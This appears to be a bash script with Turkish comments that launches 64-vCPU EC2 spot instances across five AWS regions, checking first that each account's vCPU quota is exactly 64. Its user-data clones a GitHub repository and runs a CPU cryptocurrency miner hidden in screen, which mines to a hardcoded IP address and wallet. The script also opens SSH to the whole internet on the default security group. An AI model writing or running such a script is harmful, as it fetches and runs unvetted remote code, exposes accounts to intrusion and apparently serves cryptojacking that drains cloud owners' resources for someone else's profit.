#!/bin/bash

# Spot instance türleri
declare -a instance_types=("c7a.16xlarge" "m7a.16xlarge" "r7a.16xlarge" "c7i.16xlarge" "m7i.16xlarge" "c6a.16xlarge" "m6a.16xlarge")

# Yeni bölgeler
declare -a regions=("eu-west-1" "eu-north-1" "us-east-1" "us-west-2" "eu-central-1")

# Her bölge için AMI ID'leri
declare -A ami_ids
ami_ids["eu-west-1"]="ami-0e9085e60087ce171"
ami_ids["eu-north-1"]="ami-075449515af5df0d1"
ami_ids["us-east-1"]="ami-0e2c8caa4b6378d8c"
ami_ids["us-west-2"]="ami-05d38da78ce859165"
ami_ids["eu-central-1"]="ami-0a628e1e89aaedf80"

# Başarılı ve başarısız bölgeler için diziler
success_regions=()
failed_regions=()

# vCPU limit kontrol fonksiyonu
check_vcpu_limit() {
    local region=$1
    echo "Bölge $region için vCPU limiti kontrol ediliyor..."

    vcpu_limit=$(aws service-quotas get-service-quota \
        --region "$region" \
        --service-code ec2 \
        --quota-code L-1216C47A \
        --query "Quota.Value" --output text)

    vcpu_limit=$(printf "%.0f" "$vcpu_limit")

    if [ -z "$vcpu_limit" ]; then
        echo "vCPU limiti alınamadı. Bölge $region atlanıyor."
        return 1
    fi

    echo "vCPU Limit: $vcpu_limit"

    if (( vcpu_limit != 64 )); then
        echo "vCPU limiti 64 değil. Bölge $region atlanıyor."
        return 1
    fi

    echo "Bölge $region için vCPU limiti uygun."
    return 0
}

# Uygun instance türü bulma fonksiyonu
find_instance_type() {
    local region=$1
    local shuffled_types=($(shuf -e "${instance_types[@]}"))
    local second_shuffle=($(shuf -e "${shuffled_types[@]}"))

    for instance_type in "${second_shuffle[@]}"; do
        available=$(aws ec2 describe-instance-type-offerings \
            --region "$region" \
            --filters "Name=instance-type,Values=$instance_type" "Name=location,Values=$region" \
            --query "InstanceTypeOfferings | length(@)" --output text)
        if [ "$available" -gt 0 ]; then
            echo "$instance_type"
            return
        fi
    done
    echo ""
}

# Alt bölgeleri dinamik olarak bulma fonksiyonu
find_subnet_in_az() {
    local region=$1
    local az=$2
    aws ec2 describe-subnets \
        --region "$region" \
        --filters "Name=availability-zone,Values=$az" \
        --query "Subnets[0].SubnetId" \
        --output text
}

# Spot instance talebi oluşturma fonksiyonu
create_spot_request() {
    local region=$1
    echo "Bölge: $region"

    instance_type=$(find_instance_type "$region")

    if [ -z "$instance_type" ]; then
        echo "$region bölgesinde uygun bir instance türü bulunamadı."
        failed_regions+=("$region")
        return
    fi
    echo "Seçilen instance türü: $instance_type"

    ami_id=${ami_ids[$region]}
    if [ -z "$ami_id" ]; then
        echo "$region bölgesi için AMI ID'si tanımlanmamış."
        failed_regions+=("$region")
        return
    fi

    security_group_id=$(aws ec2 describe-security-groups \
        --region "$region" \
        --filters "Name=group-name,Values=default" \
        --query "SecurityGroups[0].GroupId" \
        --output text)

    aws ec2 authorize-security-group-ingress \
        --region "$region" \
        --group-id "$security_group_id" \
        --protocol tcp --port 22 --cidr 0.0.0.0/0 2>/dev/null || true

    azs=$(aws ec2 describe-availability-zones --region "$region" --query "AvailabilityZones[].ZoneName" --output text)

    for az in $azs; do
        subnet_id=$(find_subnet_in_az "$region" "$az")
        if [ "$subnet_id" != "None" ]; then
            echo "$region bölgesinde alt bölge bulundu: $az"
            break
        fi
    done

    if [ "$subnet_id" == "None" ]; then
        echo "$region bölgesinde uygun bir alt ağ bulunamadı."
        failed_regions+=("$region")
        return
    fi

    user_data=$(cat <<EOF
#!/bin/bash
sudo yum update -y
sudo yum install git -y
cd /root
git clone https://github.com/eraemm/efsaneyim.git
cd efsaneyim
chmod 777 tnn-miner-cpu
screen -dmS spectre ./tnn-miner-cpu --spectre --daemon-address 194.238.25.124 --port 5555 --wallet spectre:qq66aq7yfpg7sfs27fmc3t5jfqx786e569la6d85hmvvn2807c6pqfj6tuz6a
screen -ls
EOF
    )

    instance_id=$(aws ec2 run-instances \
        --region "$region" \
        --image-id "$ami_id" \
        --instance-type "$instance_type" \
        --security-group-ids "$security_group_id" \
        --subnet-id "$subnet_id" \
        --instance-market-options '{"MarketType":"spot"}' \
        --user-data "$user_data" \
        --count 1 \
        --query 'Instances[0].InstanceId' --output text)

    if [ -n "$instance_id" ]; then
        echo "Spot instance talebi başarılı: $instance_id"
        success_regions+=("$region:$instance_type")
    else
        echo "Spot instance talebi başarısız."
        failed_regions+=("$region")
    fi
}

# Tüm bölgeler için spot instance talepleri
for region in "${regions[@]}"; do
    check_vcpu_limit "$region" || continue
    create_spot_request "$region"
done

# Sonuçları yazdırma
echo "İşlem sonuçları:"
echo "Başarılı bölgeler: ${success_regions[@]}"
echo "Başarısız bölgeler: ${failed_regions[@]}"
